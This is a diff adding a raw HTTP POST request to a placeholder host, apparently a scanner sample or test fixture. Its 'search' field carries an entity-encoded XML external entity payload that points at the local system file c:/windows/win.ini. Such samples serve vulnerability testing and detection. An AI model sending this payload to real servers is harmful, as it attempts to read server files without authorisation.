@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 132
+Connection: close
+
+search=&#x3C;?xml version=&#x22;1.0&#x22;?&#x3E;&#x3C;!DOCTYPE foo SYSTEM &#x22;file:///c:/windows/win.ini&#x22;&#x3E;&#x3C;r/&#x3E;
